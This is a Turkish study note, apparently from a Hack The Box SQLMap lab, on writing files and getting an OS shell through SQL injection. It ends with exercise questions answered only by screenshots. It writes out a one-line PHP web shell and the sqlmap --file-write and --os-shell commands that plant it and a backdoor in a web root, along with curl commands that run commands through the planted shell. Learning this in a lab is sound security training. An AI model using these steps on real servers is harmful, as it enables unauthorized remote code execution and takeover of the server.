Hosting sunucusuna dosya yazma söz konusu olduğunda, modern DMBS'lerde çok daha kısıtlı hale gelir, çünkü bunu remote sunucuda bir Web Shell yazmak için kullanabilir ve böylece kod çalıştırabilir ve sunucuyu ele geçirebiliriz.

Bu nedenle modern DBMS'ler varsayılan olarak dosya yazmayı devre dışı bırakır ve DBA'ların dosya yazabilmesi için belirli ayrıcalıklara ihtiyaç duyar. Örneğin MySql'de, INTO OUTFILE SQL sorgusu kullanılarak lokal dosyalara veri yazılmasına izin vermek için --secure-file-priv yapılandırmasının manuel olarak devre dışı bırakılması gerekir, ayrıca host sunucuda ihtiyaç duyduğumuz dizine yazma ayrıcalığı gibi herhangi bir lokal erişim de gereklidir.

Yine de, birçok web uygulaması DBMS'lerin dosyalara veri yazabilmesini gerektirir, bu nedenle remote sunucuya dosya yazıp yazamayacağımızı test etmeye değer. SQLMap ile bunu yapmak için --file-write ve --file-dest seçeneklerini kullanabiliriz. İlk olarak, temel bir PHP web shell'i hazırlayalım ve bunu bir shell.php dosyasına yazalım:

```shell-session
M1R4CKCK@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Şimdi, bu dosyayı remote sunucuda, Apache için varsayılan sunucu webroot'u olan /var/www/html/ dizinine yazmayı deneyelim. Eğer sunucu webroot'unu bilmiyorsak, SQLMap'in bunu nasıl otomatik olarak bulabileceğini göreceğiz.

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.11#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 17:54:18 /2020-11-19/

[17:54:19] [INFO] resuming back-end DBMS 'mysql'
[17:54:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y

[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)

[*] ending @ 17:54:28 /2020-11-19/
```

SQLMap'in dosyanın gerçekten yazıldığını doğruladığını görüyoruz:

```shell-session
[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
```

Şimdi, remote PHP shell'e erişmeyi deneyebilir ve örnek bir komut çalıştırabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la

total 148
drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

PHP shell'imizin gerçekten de remote server'da yazıldığını ve host server üzerinden komut çalıştırabildiğimizi görüyoruz.


## OS Command Execution

Artık komut çalıştırmak için bir PHP shell yazabileceğimizi doğruladığımıza göre, SQLMap'in manuel olarak bir remote shell yazmadan bize kolay bir OS shell sağlama yeteneğini test edebiliriz. SQLMap, SQL enjeksiyon açıkları aracılığıyla remote shell elde etmek için, az önce yaptığımız gibi remote shell yazmak, komutları çalıştıran ve çıktı alan SQL fonksiyonları yazmak veya hatta Microsoft SQL Server'daki xp_cmdshell gibi OS komutunu doğrudan çalıştıran bazı SQL sorgularını kullanmak gibi çeşitli teknikler kullanır. SQLMap ile bir işletim sistemi shell'i elde etmek için aşağıdaki gibi --os-shell seçeneğini kullanabiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:02:15 /2020-11-19/

[18:02:16] [INFO] resuming back-end DBMS 'mysql'
[18:02:16] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output
```

SQLMap'in bir OS shell elde etmek için varsayılan olarak UNION tekniğini kullandığını, ancak sonunda bize herhangi bir çıktı veremediğini görüyoruz Çıktı yok. Bu nedenle, birden fazla SQL enjeksiyonu güvenlik açığı türüne sahip olduğumuzu zaten bildiğimiz için, --technique=E ile belirtebileceğimiz Error-based SQL Injection gibi bize doğrudan çıktı verme şansı daha yüksek olan başka bir teknik belirlemeye çalışalım:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 18:05:59 /2020-11-19/

[18:05:59] [INFO] resuming back-end DBMS 'mysql'
[18:05:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y

[18:06:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[18:06:09] [WARNING] unable to automatically parse any web server path
[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la

do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
```

Gördüğümüz gibi, bu sefer SQLMap bizi kolay etkileşimli bir remote shell'e başarıyla bıraktı ve bize bu SQLi aracılığıyla kolay remote kod çalıştırma imkanı verdi.

Not: SQLMap ilk olarak bize PHP olduğunu bildiğimiz bu uzak sunucuda kullanılan dil türünü sordu. Daha sonra bize sunucu web root dizinini sordu ve biz de SQLMap'ten 'common location(s)' kullanarak bunu otomatik olarak bulmasını istedik. Bu seçeneklerin her ikisi de varsayılan seçeneklerdir ve SQLMap'e '--batch' seçeneğini eklemiş olsaydık otomatik olarak seçileceklerdi.

Bununla birlikte, SQLMap'in tüm ana işlevlerini ele almış olduk.


Soru : “/var/www/html/flag.txt” dosyasını okumak için SQLMap kullanmayı deneyin.

Cevap  :

![Pasted image 20241216041434.png](/img/user/resimler/Pasted%20image%2020241216041434.png)


![Pasted image 20241216041428.png](/img/user/resimler/Pasted%20image%2020241216041428.png)

![Pasted image 20241216041540.png](/img/user/resimler/Pasted%20image%2020241216041540.png)

![Pasted image 20241216041726.png](/img/user/resimler/Pasted%20image%2020241216041726.png)
![Pasted image 20241216041731.png](/img/user/resimler/Pasted%20image%2020241216041731.png)

![Pasted image 20241216041754.png](/img/user/resimler/Pasted%20image%2020241216041754.png)


Soru : Remote host üzerinde interaktif bir OS shell almak için SQLMap kullanın ve host içinde başka bir bayrak bulmaya çalışın.

Cevap : 
İlk  çalıştırdığımızda Warningleri incelersek .... (tamber beetween)
Database enum ile Database tablo ve kolonları bulduktan sonra dump ediyoruz. 

![Pasted image 20241216044746.png](/img/user/resimler/Pasted%20image%2020241216044746.png)

![Pasted image 20241216045328.png](/img/user/resimler/Pasted%20image%2020241216045328.png)
